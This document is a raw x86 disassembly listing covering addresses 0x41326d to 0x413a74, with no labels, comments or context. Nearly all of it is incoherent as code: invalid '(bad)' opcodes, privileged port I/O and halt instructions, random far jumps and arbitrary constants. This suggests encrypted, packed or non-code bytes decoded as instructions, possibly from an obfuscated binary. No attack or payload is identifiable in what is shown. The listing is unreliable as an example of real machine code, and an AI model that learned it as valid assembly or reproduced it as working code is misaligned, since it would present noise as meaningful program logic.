  41326d:	ins    DWORD PTR es:[edi],dx
  41326e:	fmulp  st(6),st
  413270:	fdivrp st(6),st
  413272:	inc    ebp
  413273:	test   eax,0x318c5de2
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	pusha  
  41327a:	ret    0x8246
  41327d:	cmc    
  41327e:	xchg   esp,eax
  41327f:	hlt    
  413280:	lahf   
  413281:	icebp  
  413282:	push   ss
  413283:	test   al,0x98
  413285:	pop    eax
  413286:	or     al,0xe
  413288:	mov    al,ch
  41328a:	repz inc edi
  41328c:	idiv   BYTE PTR [eax]
  41328e:	lods   al,BYTE PTR ds:[esi]
  41328f:	lock leave 
  413291:	mov    WORD PTR [ebp-0x1d],?
  413294:	mov    eax,0x58f73977
  413299:	or     al,0x5c
  41329b:	mov    edi,0x35f1cc71
  4132a0:	in     eax,0xf
  4132a2:	shl    BYTE PTR [eax+ebx*4-0x10290c6d],0xb
  4132aa:	fnstenv [ecx]
  4132ac:	or     dl,BYTE PTR [ebx]
  4132ae:	mov    ecx,0xd8854049
  4132b3:	xlat   BYTE PTR ds:[ebx]
  4132b4:	jns    0x4132ca
  4132b6:	pop    eax
  4132b7:	popa   
  4132b8:	cdq    
  4132b9:	dec    ebp
  4132ba:	jle    0x413338
  4132bc:	add    eax,edi
  4132be:	aad    0xc5
  4132c0:	and    ah,bh
  4132c2:	ins    BYTE PTR es:[edi],dx
  4132c3:	mov    ds:0xd8e4a3d2,eax
  4132c8:	inc    edx
  4132c9:	icebp  
  4132ca:	retf   0xa57e
  4132cd:	arpl   WORD PTR [edi-0x5d8a3286],sp
  4132d3:	aas    
  4132d4:	stc    
  4132d5:	test   dl,bl
  4132d7:	fs dec eax
  4132d9:	sub    al,0x1b
  4132db:	sbb    BYTE PTR [bx+di],ah
  4132de:	or     al,0x41
  4132e0:	or     ch,BYTE PTR [esp+esi*1]
  4132e3:	mov    eax,0x8c54c313
  4132e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132e9:	test   BYTE PTR [edx],dl
  4132eb:	daa    
  4132ec:	and    esp,ebp
  4132ee:	jle    0x4132aa
  4132f0:	add    esp,DWORD PTR [eax-0x45186c4f]
  4132f6:	aas    
  4132f7:	pop    edi
  4132f8:	dec    eax
  4132f9:	and    BYTE PTR [eax-0x3c],bl
  4132fc:	jl     0x4132a0
  4132fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ff:	sub    eax,0x5b70988
  413304:	arpl   WORD PTR [edx-0x42a1bf64],ax
  41330a:	(bad)  [edi]
  41330c:	sbb    al,0x5a
  41330e:	pop    esp
  41330f:	out    0x87,eax
  413311:	jp     0x41334e
  413313:	in     al,dx
  413314:	xor    eax,0x2c6b2b64
  413319:	push   esp
  41331a:	loop   0x4132ee
  41331c:	xor    BYTE PTR [ebp+edx*4-0xde51038],al
  413323:	jb     0x413350
  413325:	dec    ecx
  413326:	in     eax,dx
  413327:	popa   
  413328:	dec    eax
  413329:	(bad)  
  41332a:	(bad)  
  41332b:	sbb    BYTE PTR [eax+0x61],bh
  41332e:	out    0x6e,al
  413330:	into   
  413331:	je     0x4133b0
  413333:	xchg   DWORD PTR ds:0xab0d6ec0,esi
  413339:	jg     0x4133a3
  41333b:	pusha  
  41333c:	push   ss
  41333d:	fdivr  QWORD PTR [eax+esi*4+0x5a1afde6]
  413344:	ficomp WORD PTR [ebp+0x16953f8c]
  41334a:	add    eax,0x5a668ac3
  41334f:	and    DWORD PTR [edx+0x1f],edx
  413352:	sub    al,0x20
  413354:	out    dx,al
  413355:	test   DWORD PTR [ebp+0x6e3f6674],edx
  41335b:	cmp    DWORD PTR [ecx-0x635383ba],ebp
  413361:	frstpm(287 only) 
  413363:	movmskps ebx,xmm4
  413366:	leave  
  413367:	loopne 0x41331e
  413369:	out    0xf6,al
  41336b:	sub    eax,0x59fcf01f
  413370:	cdq    
  413371:	and    eax,0xf7266d85
  413376:	fisttp WORD PTR [eax-0x2deafee6]
  41337c:	sar    DWORD PTR [edi-0x6e],0x2b
  413380:	dec    edi
  413381:	int    0x48
  413383:	pop    ss
  413384:	mov    ebx,0x5fd030cb
  413389:	add    eax,0x9592e0c
  41338e:	mov    ds:0x4746b5c2,al
  413393:	test   BYTE PTR [eax+0x12f5362],bl
  413399:	dec    ebp
  41339a:	xchg   BYTE PTR [eax-0xb],cl
  41339d:	xor    al,0x7c
  41339f:	sub    eax,0x21a289dd
  4133a4:	sub    bl,dh
  4133a6:	and    ecx,DWORD PTR [ecx-0x13]
  4133a9:	push   edx
  4133aa:	clc    
  4133ab:	cld    
  4133ac:	or     al,0x1f
  4133ae:	adc    eax,0x5a98a4e1
  4133b3:	mov    ?,WORD PTR [edx-0x5a]
  4133b6:	dec    edi
  4133b7:	mov    cl,dl
  4133b9:	sub    BYTE PTR [edi+0x31],cl
  4133bc:	std    
  4133bd:	xor    al,0xde
  4133bf:	ins    BYTE PTR es:[edi],dx
  4133c0:	pop    ss
  4133c1:	and    al,0x1b
  4133c3:	(bad)  [eax+0x67]
  4133c6:	jae    0x413422
  4133c8:	sub    al,0xad
  4133ca:	stos   DWORD PTR es:[edi],eax
  4133cb:	jb     0x413360
  4133cd:	and    esp,DWORD PTR [edi-0x55ba9273]
  4133d3:	mov    esi,0x7b3b2dad
  4133d8:	jg     0x4133a8
  4133da:	jp     0x4133ca
  4133dc:	in     eax,0x30
  4133de:	imul   ecx,DWORD PTR [edx],0x4c03205c
  4133e4:	mov    ebp,0xf3f1c044
  4133e9:	pop    di
  4133eb:	sbb    ah,BYTE PTR [edi-0x3c]
  4133ee:	test   edx,ebx
  4133f0:	push   ecx
  4133f1:	add    ebp,ecx
  4133f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133f4:	xchg   ebp,eax
  4133f5:	out    dx,eax
  4133f6:	scas   al,BYTE PTR es:[edi]
  4133f7:	jmp    0x4133b3
  4133f9:	push   0xa3452f44
  4133fe:	or     edx,DWORD PTR [ebx+0x59419fa4]
  413404:	lds    edi,FWORD PTR [ebx+edi*1-0x67]
  413408:	sub    ecx,DWORD PTR [edx]
  41340a:	jmp    0x4710:0xc75ecb20
  413411:	lods   eax,DWORD PTR ds:[esi]
  413412:	nop    DWORD PTR [ebx-0x3d]
  413416:	pop    edx
  413417:	pusha  
  413418:	pop    ecx
  413419:	sbb    al,0xe8
  41341b:	ds sbb al,0x20
  41341e:	dec    esp
  41341f:	scas   eax,DWORD PTR es:[edi]
  413420:	fs sahf 
  413422:	aam    0x47
  413424:	test   BYTE PTR [ecx+ebx*8],dh
  413427:	idiv   DWORD PTR [eax+eax*1]
  41342a:	cmp    al,0xb0
  41342c:	stos   BYTE PTR es:[edi],al
  41342d:	mov    ebp,0x4581882e
  413432:	nop
  413433:	enter  0x5c18,0x6
  413437:	ja     0x413438
  413439:	out    dx,eax
  41343a:	or     BYTE PTR [ebx],ah
  41343c:	fld    QWORD PTR [ebp-0x387bd380]
  413442:	mov    ch,0xa8
  413444:	mov    ecx,0x15ba825
  413449:	stos   BYTE PTR es:[edi],al
  41344a:	pop    edx
  41344b:	pop    ecx
  41344c:	or     DWORD PTR [edx-0x70],esi
  41344f:	xor    eax,0xb8cb03f7
  413454:	and    DWORD PTR ds:[eax],eax
  413457:	add    BYTE PTR [ecx+0x458be04d],cl
  41345d:	loopne 0x41346e
  41345f:	test   BYTE PTR [esi],al
  413461:	pop    ss
  413462:	add    BYTE PTR [eax],al
  413464:	not    DWORD PTR ds:0x42fd79
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fd55,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xb929e00f,al
  413492:	jb     0x413480
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x7c70707e
  41349c:	mov    eax,ds:0x6f334785
  4134a1:	in     al,0xb4
  4134a3:	cmc    
  4134a4:	idiv   BYTE PTR [ecx*1+0x4759e007]
  4134ab:	mov    eax,ds:0x297469dc
  4134b0:	adc    al,0x91
  4134b2:	inc    ecx
  4134b3:	jl     0x4134a7
  4134b5:	dec    edx
  4134b6:	leave  
  4134b7:	push   esi
  4134b8:	mov    bl,0xca
  4134ba:	lds    edi,FWORD PTR [ebx+eiz*8+0x17]
  4134be:	jmp    0x270b55d2
  4134c3:	aas    
  4134c4:	test   ax,0xf7ce
  4134c8:	dec    edx
  4134c9:	xchg   esi,eax
  4134ca:	sbb    DWORD PTR [edi+0x209c558a],ebp
  4134d0:	cmp    DWORD PTR [esp+esi*4],edi
  4134d3:	sub    eax,ebx
  4134d5:	nop
  4134d6:	mov    dl,0xb2
  4134d8:	ins    BYTE PTR es:[edi],dx
  4134d9:	call   0xec2a6c6
  4134de:	adc    eax,DWORD PTR [edx+0x5c866249]
  4134e4:	jmp    0x413538
  4134e6:	rcr    dl,1
  4134e8:	mov    al,ds:0x6c3a981f
  4134ed:	xchg   ebp,eax
  4134ee:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4134f0:	loopne 0x4134a7
  4134f2:	add    dl,bl
  4134f4:	pusha  
  4134f5:	push   0xffffffc4
  4134f7:	and    edi,esi
  4134f9:	adc    eax,0x1b1f24f4
  4134fe:	mov    WORD PTR ss:[edi],cs
  413501:	jmp    0xd9b349c7
  413506:	push   ecx
  413507:	xchg   ebp,eax
  413508:	or     dl,ch
  41350a:	jae    0x41354e
  41350c:	dec    esi
  41350d:	lds    ebp,FWORD PTR [edx+0x4d5e5994]
  413513:	lock sub esp,DWORD PTR [edi]
  413516:	gs int 0xe2
  413519:	idiv   esp
  41351b:	mov    ds:0x6325dd28,al
  413520:	fisub  WORD PTR [esi]
  413522:	fs call 0x16ffe9b8
  413528:	js     0x41357b
  41352a:	sbb    ebx,DWORD PTR [esi+0x36]
  41352d:	pop    ds
  41352e:	pusha  
  41352f:	test   al,0x42
  413531:	cld    
  413532:	pop    ss
  413533:	sub    eax,0x45ce1fb1
  413538:	cmp    al,0x76
  41353a:	dec    ebp
  41353b:	and    esi,DWORD PTR [ebp-0x33]
  41353e:	dec    ebp
  41353f:	dec    esp
  413540:	mov    al,0xa6
  413542:	test   WORD PTR [edi-0x2e],di
  413546:	mov    al,0x2d
  413548:	jne    0x413560
  41354a:	add    ecx,edi
  41354c:	mov    al,0x27
  41354e:	or     al,0x6
  413550:	pop    eax
  413551:	xor    DWORD PTR [edx+0x59],ecx
  413554:	mov    edx,0xc28ce741
  413559:	out    dx,eax
  41355a:	pop    es
  41355b:	xor    eax,0xec1e5422
  413560:	sub    BYTE PTR [ebp+ecx*1-0x2d71a275],cl
  413567:	inc    ecx
  413568:	add    DWORD PTR [ebp+eax*1-0x11],ebx
  41356c:	nop
  41356d:	retf   
  41356e:	mov    edx,0x143674a5
  413573:	cmpss  xmm1,DWORD PTR [edi+0x1b3ac6a9],0x53
  41357c:	sbb    eax,0x75014d17
  413581:	sbb    edx,edx
  413583:	gs jmp 0x41357a
  413586:	mov    al,0x27
  413588:	mov    ah,0x7d
  41358a:	xlat   BYTE PTR ds:[ebx]
  41358b:	sub    eax,0x9ea129b
  413590:	xchg   ecx,eax
  413591:	lea    esp,[ebx-0x50]
  413594:	sub    al,bh
  413596:	xor    dl,cl
  413598:	pop    ss
  413599:	sub    dh,BYTE PTR ds:0x619a1ea4
  41359f:	sbb    BYTE PTR [ecx-0x47],dh
  4135a2:	mov    ds:0x46daddcc,al
  4135a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135a8:	daa    
  4135a9:	mov    al,0xb4
  4135ab:	stos   DWORD PTR es:[edi],eax
  4135ac:	jmp    0x7abe:0x3ce0eab9
  4135b3:	adc    esp,edx
  4135b5:	sub    al,BYTE PTR [ecx]
  4135b7:	data16 aaa 
  4135b9:	test   BYTE PTR [eax],0x4a
  4135bc:	or     esp,DWORD PTR [edx+edx*2+0xb]
  4135c0:	call   0xfcef:0x862a74f8
  4135c7:	jae    0x413633
  4135c9:	pusha  
  4135ca:	stos   DWORD PTR es:[edi],eax
  4135cb:	retf   
  4135cc:	sbb    eax,0xcf90b5fc
  4135d1:	push   0xffffff81
  4135d3:	pop    ecx
  4135d4:	popa   
  4135d5:	xchg   esp,eax
  4135d6:	mov    ah,0x6f
  4135d8:	out    0xde,eax
  4135da:	sbb    eax,0x1813457
  4135df:	xlat   BYTE PTR ds:[ebx]
  4135e0:	dec    esi
  4135e1:	sahf   
  4135e2:	xchg   edx,eax
  4135e3:	pop    edi
  4135e4:	pop    ecx
  4135e5:	scas   al,BYTE PTR es:[edi]
  4135e6:	pop    ds
  4135e7:	scas   eax,DWORD PTR es:[edi]
  4135e8:	xor    eax,0xe23f2c5
  4135ed:	ins    DWORD PTR es:[edi],dx
  4135ee:	daa    
  4135ef:	std    
  4135f0:	adc    al,0x4e
  4135f2:	mov    cl,0x57
  4135f4:	push   cs
  4135f5:	int    0x46
  4135f7:	jns    0x4135e1
  4135f9:	(bad)  
  4135fa:	into   
  4135fb:	push   es
  4135fc:	sti    
  4135fd:	shl    DWORD PTR [eax+0x30e5b9b1],cl
  413603:	sbb    al,0x99
  413605:	pop    edi
  413606:	pop    ebp
  413607:	cmc    
  413608:	shr    DWORD PTR [edi+0x21],cl
  41360b:	and    eax,0x57ada317
  413610:	mov    eax,ds:0xa6f0ff88
  413615:	add    DWORD PTR [edx+0xc],edi
  413618:	fisttp QWORD PTR [esp+eiz*8+0x36b4b727]
  41361f:	jmp    0xdf98:0x1df1ea47
  413626:	mov    bl,0x57
  413628:	cli    
  413629:	(bad)  
  41362a:	jae    0x413659
  41362c:	aam    0x26
  41362e:	sbb    al,0x6
  413630:	cmc    
  413631:	xchg   edx,eax
  413632:	cmp    BYTE PTR [ebx+eiz*2+0x36db4eaa],bl
  413639:	retf   
  41363a:	shl    BYTE PTR [ecx+ecx*2],cl
  41363d:	pop    ebp
  41363e:	cmc    
  41363f:	into   
  413640:	push   cs
  413641:	sar    DWORD PTR ds:0xd7e91db,cl
  413647:	outs   dx,DWORD PTR ds:[esi]
  413648:	inc    esp
  413649:	inc    ecx
  41364a:	shl    DWORD PTR [bx+si],1
  41364d:	and    BYTE PTR [edx-0x30],0xa6
  413651:	ins    DWORD PTR es:[edi],dx
  413652:	jno    0x4136b5
  413654:	test   BYTE PTR es:[esi],dh
  413657:	mov    dl,0xb5
  413659:	and    esi,DWORD PTR [eax]
  41365b:	ret    0x1d5f
  41365e:	add    bh,BYTE PTR [ebp+eax*2+0x3abf6cc0]
  413665:	push   esp
  413666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413667:	jno    0x41361e
  413669:	hlt    
  41366a:	hlt    
  41366b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41366c:	jne    0x41361e
  41366e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41366f:	ret    0x8df2
  413672:	nop
  413673:	xor    cl,BYTE PTR [edx-0x5a]
  413676:	cmp    BYTE PTR [esi+ebp*4+0x3e],0xdd
  41367b:	inc    esp
  41367c:	ins    BYTE PTR es:[edi],dx
  41367d:	jnp    0x4136e6
  41367f:	jae    0x4136e5
  413681:	das    
  413682:	sub    BYTE PTR [ebp+0x1f],dl
  413685:	push   edi
  413686:	and    esi,DWORD PTR [edx]
  413688:	aas    
  413689:	outs   dx,BYTE PTR ds:[esi]
  41368a:	aas    
  41368b:	out    0x23,eax
  41368d:	test   DWORD PTR [ecx*2+0x5af39588],eax
  413694:	call   0xe016:0x903733c6
  41369b:	imul   DWORD PTR [ebx]
  41369d:	push   edx
  41369e:	cs dec ebp
  4136a0:	cmp    DWORD PTR [ecx-0x75],0x8fa41433
  4136a7:	mov    esi,0xef1e00fd
  4136ac:	dec    edx
  4136ad:	sti    
  4136ae:	jnp    0x413638
  4136b0:	adc    DWORD PTR [eax+0x34],esi
  4136b3:	sbb    esp,DWORD PTR fs:[edi-0xe]
  4136b7:	add    al,0xe0
  4136b9:	add    al,0xe3
  4136bb:	(bad)  ds:0x561af22c
  4136c1:	es and bl,ah
  4136c4:	sub    edi,DWORD PTR [eax+0xc]
  4136c7:	xchg   ebx,eax
  4136c8:	(bad)  [eax-0x5d]
  4136cb:	push   esi
  4136cc:	(bad)  
  4136cd:	int3   
  4136ce:	inc    ebp
  4136cf:	pushf  
  4136d0:	sbb    ch,BYTE PTR [ebx+0x11]
  4136d3:	and    edx,DWORD PTR [ebp+ebp*4+0x58dc95ea]
  4136da:	push   ss
  4136db:	push   cs
  4136dc:	jnp    0x41367c
  4136de:	lahf   
  4136df:	test   al,0xdc
  4136e1:	(bad)  
  4136e2:	push   0xffffff9a
  4136e4:	arpl   WORD PTR [eax+0x6f],dx
  4136e7:	sti    
  4136e8:	lods   al,BYTE PTR ds:[esi]
  4136e9:	ficomp WORD PTR [edi]
  4136eb:	inc    ecx
  4136ec:	nop
  4136ed:	std    
  4136ee:	sub    eax,0xff93672
  4136f3:	rcr    ecx,0x8
  4136f6:	ins    BYTE PTR es:[edi],dx
  4136f7:	jno    0x413679
  4136f9:	mov    edx,0xccf8b53d
  4136fe:	push   ds
  4136ff:	nop
  413700:	xchg   esp,eax
  413701:	mov    bl,0xfa
  413703:	jl     0x41372f
  413705:	stos   DWORD PTR es:[edi],eax
  413706:	jns    0x4136b4
  413708:	sar    bh,cl
  41370a:	xchg   DWORD PTR [edi-0x63],edx
  41370d:	jno    0x413788
  41370f:	xor    al,0x15
  413711:	aam    0x1f
  413713:	inc    ecx
  413714:	iret   
  413715:	in     eax,dx
  413716:	sbb    BYTE PTR [ebx],bh
  413718:	popa   
  413719:	(bad)  
  41371a:	and    bl,ah
  41371c:	mov    edx,0xe7089a53
  413721:	cmovae esp,DWORD PTR [edi-0x412ed39c]
  413728:	js     0x413754
  41372a:	and    edx,DWORD PTR [ebx+0x4a607b21]
  413730:	clc    
  413731:	pop    ecx
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	mov    ds:0x3be13b89,al
  413738:	cmp    eax,0x4ae06f96
  41373d:	ss loop 0x4136fe
  413740:	dec    esp
  413741:	xchg   ecx,eax
  413742:	sbb    BYTE PTR [ebp+0x6b],bl
  413745:	stos   DWORD PTR es:[edi],eax
  413746:	fadd   st(6),st
  413748:	xor    al,0x54
  41374a:	push   edi
  41374b:	add    eax,0x553ad99d
  413750:	imul   ebp,DWORD PTR [edx-0x12ddbb27],0x5c26a5b9
  41375a:	xor    dh,BYTE PTR [ecx]
  41375c:	(bad)  
  41375d:	fisub  DWORD PTR [esi+ebp*8-0x7c4cc74]
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	(bad)  
  41377f:	fnstsw ax
  413781:	call   0x70b1a2bb
  413786:	mov    ecx,0xb470707e
  41378b:	xchg   ebp,eax
  41378c:	add    edi,0x7e59d0e0
  413792:	imul   edx,ebp,0xbb926f02
  413798:	test   BYTE PTR [eax+eiz*1],al
  41379b:	(bad)  
  41379c:	cmp    ecx,esi
  41379e:	pop    es
  41379f:	fnstenv [ecx+0x11]
  4137a2:	jno    0x413817
  4137a4:	xchg   BYTE PTR [eax],dh
  4137a6:	jnp    0x4137bf
  4137a8:	ss mov dl,0xac
  4137ab:	push   edx
  4137ac:	jns    0x413809
  4137ae:	and    bh,BYTE PTR [ecx+ebx*1+0x67]
  4137b2:	or     eax,0x307b269d
  4137b7:	dec    ebp
  4137b8:	ins    BYTE PTR es:[edi],dx
  4137b9:	fimul  WORD PTR [edx-0x6021bc7]
  4137bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137c0:	or     ecx,DWORD PTR [ebx+0x52d1146d]
  4137c6:	call   0x6474dbc2
  4137cb:	stos   BYTE PTR es:[edi],al
  4137cc:	cmp    eax,0xa428fcb
  4137d1:	mov    dl,0xa9
  4137d3:	xchg   ebx,eax
  4137d4:	int    0xd7
  4137d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137d7:	aaa    
  4137d8:	fistp  WORD PTR [edi+0x47]
  4137db:	in     eax,0x14
  4137dd:	loope  0x41379f
  4137df:	jp     0x4137a3
  4137e1:	cwde   
  4137e2:	mul    ebx
  4137e4:	and    al,0x1d
  4137e6:	push   cs
  4137e7:	or     eax,0x9aedb052
  4137ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ed:	mov    ch,0xa8
  4137ef:	gs out 0x6,eax
  4137f2:	xor    ch,0xd7
  4137f5:	fsubr  QWORD PTR [ebp-0x5793d789]
  4137fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137fc:	pop    esi
  4137fd:	sub    bh,bh
  4137ff:	sub    al,0xd1
  413801:	cli    
  413802:	popf   
  413803:	mov    al,0xea
  413805:	call   0x60e4:0xf658f6b6
  41380c:	ins    DWORD PTR es:[edi],dx
  41380d:	mov    eax,0x169985e6
  413812:	daa    
  413813:	test   DWORD PTR [ebp-0x57f51184],ebx
  413819:	pop    es
  41381a:	data16 sahf 
  41381c:	dec    edx
  41381d:	in     eax,0x55
  41381f:	adc    eax,DWORD PTR [edx+0x2fcd8569]
  413825:	xor    DWORD PTR [ebx],0xffffff98
  413828:	mov    eax,0x2f4f2d1
  41382d:	lahf   
  41382e:	push   ds
  41382f:	push   ecx
  413830:	or     al,0xce
  413832:	je     0x413821
  413834:	(bad)  [edi]
  413836:	mov    ebx,0x517dfc9e
  41383b:	cmp    al,0xe8
  41383d:	out    0x6b,al
  41383f:	call   0x50cb:0xd5bc2990
  413846:	pop    ebx
  413847:	xor    DWORD PTR [esi+0x71],ebx
  41384a:	mov    edx,0xba138879
  41384f:	xchg   esp,eax
  413850:	or     DWORD PTR [ecx],ebx
  413852:	jmp    0x41a7:0x5cb726aa
  413859:	fcomp  DWORD PTR [ecx+ecx*4-0x43]
  41385d:	jnp    0x413831
  41385f:	out    dx,al
  413860:	sub    edx,ecx
  413862:	scas   al,BYTE PTR es:[edi]
  413863:	mov    eax,ds:0x74da861
  413868:	mov    eax,0x8c362c72
  41386d:	enter  0x9db7,0x9b
  413871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413872:	fmul   QWORD PTR [edx+eax*8+0x3f7e75d3]
  413879:	add    BYTE PTR [esi-0x116771bc],ah
  41387f:	cmp    al,0x2a
  413881:	loope  0x413812
  413883:	add    eax,0xb1880df0
  413888:	stos   DWORD PTR es:[edi],eax
  413889:	jl     0x4138fc
  41388b:	test   eax,0x648887c4
  413890:	mov    al,BYTE PTR [edx-0x231a1870]
  413896:	and    al,0xa
  413898:	jecxz  0x413910
  41389a:	shl    BYTE PTR [edi-0x5acbf71d],0xfd
  4138a1:	cmp    eax,0x5d68531c
  4138a6:	ss pop ebp
  4138a8:	jo     0x4138e6
  4138aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138ab:	inc    edx
  4138ac:	leave  
  4138ad:	outs   dx,BYTE PTR ds:[esi]
  4138ae:	pop    ss
  4138af:	call   0x8240:0x3b578907
  4138b6:	sub    bl,ah
  4138b8:	mov    edx,0x8fa75a9a
  4138bd:	pop    edx
  4138be:	std    
  4138bf:	adc    bh,BYTE PTR [ebx-0x47b0775]
  4138c5:	retf   0xbee9
  4138c8:	sbb    bh,BYTE PTR [ecx-0x4922c866]
  4138ce:	cmp    al,0xd8
  4138d0:	jb     0x413898
  4138d2:	adc    DWORD PTR [ecx+0x52ed6792],esp
  4138d8:	jl     0x41387a
  4138da:	test   BYTE PTR ds:0xb6ace5d2,0xd7
  4138e1:	ja     0x413929
  4138e3:	mov    eax,ds:0xc4cce2d3
  4138e8:	cli    
  4138e9:	(bad)  
  4138ea:	cmp    dh,al
  4138ec:	push   cs
  4138ed:	cmc    
  4138ee:	xor    edi,DWORD PTR [edi-0x5023b2d7]
  4138f4:	nop
  4138f5:	push   0x3f
  4138f7:	xchg   cx,ax
  4138f9:	pop    esi
  4138fa:	mov    DWORD PTR [edx],0x1b20690b
  413900:	inc    ebp
  413901:	es sbb eax,0xc5a40622
  413907:	ficomp DWORD PTR ds:0x573585d3
  41390d:	add    al,0xf4
  41390f:	and    al,0x85
  413911:	push   ebp
  413912:	ror    BYTE PTR [edi-0x6e9110e7],1
  413918:	in     eax,dx
  413919:	mov    ebp,0xc93b6cb7
  41391e:	call   0x6dd048f3
  413923:	or     al,0x3f
  413925:	mov    di,0x92b6
  413929:	and    esp,esp
  41392b:	jle    0x4138e0
  41392d:	adc    al,0x29
  41392f:	int    0xc8
  413931:	and    DWORD PTR [ebp-0x41a76131],eax
  413937:	icebp  
  413938:	cmp    DWORD PTR [ecx+edi*8-0x7c8eb9e4],edi
  41393f:	push   ebp
  413940:	cmp    DWORD PTR [edi+0x70],0x77
  413944:	imul   edi,DWORD PTR [edi-0x1],0x24
  413948:	adc    esi,DWORD PTR [eax]
  41394a:	and    ah,cl
  41394c:	xor    esp,DWORD PTR [edi+0xf]
  41394f:	sahf   
  413950:	dec    edi
  413951:	mov    dl,0xd
  413953:	pushf  
  413954:	jo     0x41397f
  413956:	scas   eax,DWORD PTR es:[edi]
  413957:	pushf  
  413958:	mov    esp,0x1938906e
  41395d:	arpl   WORD PTR [eax],bp
  41395f:	loopne 0x413945
  413961:	jp     0x4139b1
  413963:	push   edi
  413964:	xor    al,0x57
  413966:	jae    0x413949
  413968:	enter  0x8f73,0xde
  41396c:	cdq    
  41396d:	cmp    ecx,ebp
  41396f:	jne    0x413963
  413971:	cld    
  413972:	inc    esi
  413973:	xor    eax,0x58b2fa58
  413978:	popa   
  413979:	int3   
  41397a:	pusha  
  41397b:	ins    DWORD PTR es:[edi],dx
  41397c:	call   0xf38dd523
  413981:	sub    DWORD PTR cs:[eax],0x28
  413985:	ret    0xf1c0
  413988:	hlt    
  413989:	jecxz  0x413916
  41398b:	mov    edx,ebx
  41398d:	jae    0x413984
  41398f:	ss pusha 
  413991:	add    al,0xa6
  413993:	mov    eax,0xa2204e4c
  413998:	inc    ebp
  413999:	mov    dx,0xaa43
  41399d:	fimul  WORD PTR [ebx+0x1c6bc31d]
  4139a3:	repz lahf 
  4139a5:	mov    al,gs:0x4259ade6
  4139ab:	xchg   ebx,eax
  4139ac:	cli    
  4139ad:	dec    esp
  4139ae:	nop
  4139af:	(bad)  
  4139b0:	icebp  
  4139b1:	ins    DWORD PTR es:[edi],dx
  4139b2:	in     al,dx
  4139b3:	pop    ebx
  4139b4:	xchg   edx,eax
  4139b5:	cmp    eax,0x6d3f4142
  4139ba:	loopne 0x4139d6
  4139bc:	das    
  4139bd:	loop   0x41397a
  4139bf:	aam    0x5f
  4139c1:	js     0x4139a6
  4139c3:	popf   
  4139c4:	imul   esi,ebp,0xffffffc8
  4139c7:	stos   DWORD PTR es:[edi],eax
  4139c8:	mov    al,ds:0xc831403f
  4139cd:	in     al,dx
  4139ce:	std    
  4139cf:	addr16 js 0x4139fa
  4139d2:	outs   dx,DWORD PTR ds:[esi]
  4139d3:	fiadd  WORD PTR [ebx]
  4139d5:	mov    cl,BYTE PTR [edx+0x43674aed]
  4139db:	ins    DWORD PTR es:[edi],dx
  4139dc:	or     dh,dl
  4139de:	aam    0xcf
  4139e0:	rcl    BYTE PTR [edi+0x39e39327],cl
  4139e6:	mov    ds:0x7c60de27,al
  4139eb:	mov    ebx,0x883f95f2
  4139f0:	inc    esi
  4139f1:	mov    ebp,0x2286269d
  4139f6:	or     esp,DWORD PTR cs:[esi-0x56]
  4139fa:	mov    esp,ecx
  4139fc:	nop
  4139fd:	and    eax,0x33e5c364
  413a02:	dec    edx
  413a03:	jge    0x413a49
  413a05:	mov    ds:0xb93635f4,eax
  413a0a:	arpl   WORD PTR [edx+0x75f0633d],bp
  413a10:	sub    esi,DWORD PTR [ebp+0x47]
  413a13:	shr    BYTE PTR [edi+0x65612415],0xb5
  413a1a:	adc    DWORD PTR [edx],eax
  413a1c:	or     al,0xae
  413a1e:	and    DWORD PTR [ecx+0x236154f5],0xd0053f37
  413a28:	jl     0x413a2d
  413a2a:	sbb    bh,BYTE PTR [esi]
  413a2c:	popf   
  413a2d:	in     al,dx
  413a2e:	sub    esp,DWORD PTR [esp+edi*8]
  413a31:	jns    0x413a28
  413a33:	lods   eax,DWORD PTR ds:[esi]
  413a34:	pop    ds
  413a35:	xor    ebp,ecx
  413a37:	and    BYTE PTR [ecx],bl
  413a39:	or     al,0x36
  413a3b:	lds    ecx,FWORD PTR [ebp-0x6e]
  413a3e:	pop    edx
  413a3f:	mov    cl,0x10
  413a41:	jg     0x413a5e
  413a43:	icebp  
  413a44:	xor    BYTE PTR [eax],cl
  413a46:	mov    ah,0x3a
  413a48:	adc    DWORD PTR [ebp-0x25531f25],ebx
  413a4e:	jo     0x413a27
  413a50:	cli    
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	aad    0x32
  413a69:	lea    edi,[esi+edi*2-0x468f8f98]
  413a70:	jle    0x413ae2
  413a72:	jo     0x4139f7
  413a74:	nop
